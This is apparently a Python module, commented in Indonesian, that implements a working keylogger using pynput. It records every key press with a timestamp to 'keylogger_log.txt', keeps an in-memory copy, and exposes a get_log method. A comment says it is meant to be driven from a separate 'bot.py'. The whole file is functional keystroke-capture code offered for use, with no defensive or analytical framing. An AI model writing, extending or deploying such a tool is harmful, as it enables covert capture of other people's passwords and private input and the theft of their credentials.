from pynput import keyboard
import threading
import time

class KeyLogger:
    def __init__(self):
        self.is_running = False
        self.log = []
        self.listener = None
        self.log_file = "keylogger_log.txt"
        self.lock = threading.Lock()  # Untuk mencegah race condition saat akses log
        self.last_timestamp = None  # Menyimpan timestamp terakhir

    def format_key(self, key):
        """ Mengubah tombol menjadi teks yang lebih mudah dibaca """
        if hasattr(key, 'char'):  # Jika tombol berupa karakter
            return key.char
        elif key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.tab:
            return "\t"
        elif key == keyboard.Key.backspace:
            return "[BACKSPACE]"
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            return ""  # Tidak perlu mencatat tombol shift
        else:
            return f"[{key.name}]"  # Tombol lainnya ditulis dalam []

    def on_press(self, key):
        """ Callback saat tombol ditekan """
        formatted_key = self.format_key(key)
        timestamp = time.strftime("[%Y-%m-%d %H:%M:%S]")  # Format waktu

        with self.lock:  # Gunakan lock agar aman di multi-threading
            # Jika timestamp sama dengan yang terakhir, gabungkan huruf
            if self.last_timestamp == timestamp:
                self.log[-1] = self.log[-1] + formatted_key  # Gabungkan dengan log terakhir
            else:
                self.log.append(f"{timestamp} {formatted_key}")  # Tambah log baru

            # Update timestamp terakhir
            self.last_timestamp = timestamp

            # Simpan ke file
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"{timestamp} {formatted_key}\n")

    def start(self):
        """ Memulai keylogger """
        if not self.is_running:
            self.is_running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            print("[INFO] Keylogger started...")

    def stop(self):
        """ Menghentikan keylogger """
        if self.is_running:
            self.is_running = False
            if self.listener:
                self.listener.stop()
                self.listener = None  # Hapus instance listener
            print("[INFO] Keylogger stopped.")

    def get_log(self):
        """ Mengambil log dalam bentuk string """
        with self.lock:
            return "\n".join(self.log)

# Instance keylogger agar bisa dipanggil dari `bot.py`
keylogger = KeyLogger()
